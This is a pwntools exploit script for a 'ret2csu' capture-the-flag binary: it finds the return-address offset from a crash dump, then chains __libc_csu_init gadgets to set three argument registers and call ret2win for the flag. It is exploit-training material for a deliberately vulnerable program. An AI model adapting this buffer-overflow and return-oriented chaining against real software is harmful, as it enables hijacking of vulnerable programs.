from pwn import *

# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


# Find offset to EIP/RIP for buffer overflows
def find_ip(payload):
    # Launch process and send payload
    p = process(exe)
    p.sendlineafter('>', payload)
    # Wait for the process to crash
    p.wait()
    # Print out the address of EIP/RIP at the time of crashing
    ip_offset = cyclic_find(p.corefile.pc)  # x86
    # ip_offset = cyclic_find(p.corefile.read(p.corefile.sp, 4))  # x64
    info('located EIP/RIP offset at {a}'.format(a=ip_offset))
    return ip_offset


# Specify GDB script here (breakpoints etc)
gdbscript = '''
init-pwndbg
continue
'''.format(**locals())


# Binary filename
exe = './ret2csu'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (warning/info/debug)
context.log_level = 'info'
# Deletes core files if used
context.delete_corefiles = True

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

# Start program
io = start()

# Function we need to execute to get flag
ret2win = 0x400510
# Address needed to put parameters in registers
pop_rdi = 0x4006a3  # pop rdi; ret
# We can't easily pop final param to rdx so we need this:
pop_rbx_rbp_r12_r13_r14_r15 = 0x40069a  # pop rbp; pop rbx; pop r12; pop r13; pop r14; pop r15; ret
csu_mov = 0x400680  # mov rdx, r15; mov rsi, r14; mov edi, r13, call QWORD PTR [r12+rbx*8]; ret

# Print out the target addresses/gadgets
info("%#x ret2win", ret2win)
info("%#x pop rdi; ret", pop_rdi)
info("%#x pop rbp; pop rbx; pop r12; pop r13; pop r14; pop r15; ret", pop_rbx_rbp_r12_r13_r14_r15)
info("%#x mov rdx, r15; mov rsi, r14; mov edi, r13, call QWORD PTR [r12+rbx*8]; ret", csu_mov)

# Find Buffer overflow
payload = cyclic(100)

# Send payload
io.sendlineafter("> ", payload)

# Wait for crash
io.wait()

# Displaying what the bits for the program is
info("Running offset check for {} Bits".format(context.bits))

# Read the crash file
core = io.corefile

# Locate for 64 bits
if context.bits == 64:
    # Locate RIP value and offset
    stack = core.rsp
    # Looks for the first 4 characters of the rsp to find the offset for RIP
    pattern = core.read(stack,4)
    # Finds RIP offset with pattern
    offset = cyclic_find(pattern)
    # Display offset
    info("Located RIP at {a}".format(a=offset))

# Locate for 32 bits
elif context.bits == 32:
    # Locate EIP value and offset
    eip_value = core.eip
    offset = cyclic_find(eip_value)
    # Display offset
    info("Located EIP at {a}".format(a=offset))

# Build the payload
payload = flat({
    offset: [pop_rbx_rbp_r12_r13_r14_r15,
    0x3,  # rbx (set to 3 because will be incremented and then compared to RBP)
    0x4,  # rbp
    0x600e30,  # r12 - ensures we can return to __libc_csu_init
    0xdeadbeefdeadbeef,  # r13 will be moved to rdi by csu_mov
    0xcafebabecafebabe,  # r14 will be moved to rsi by csu_mov
    0xd00df00dd00df00d,  # r15 will be moved to rdx by csu_mov
    csu_mov,  # Move params to where they need to be for function calls
    pack(0) * 7,  # Deal with the 6 pops
    pop_rdi,  # Pop deadbeef into RDI again
    0xdeadbeefdeadbeef,  # We only copied half over earlier (check debugger)
    ret2win  # pwn???
    ]
})

# Save the payload to file
write('payload', payload)

# Start the process again
io = start()

# Send the payload
io.sendlineafter('> ', payload)
io.recvuntil('Thank you!\n')

# Or, Get our flag!
flag = io.recv()

try:
    success("{}".format(flag))
except AttributeError:
    print("[+] Flag: {}".format(str(flag)))
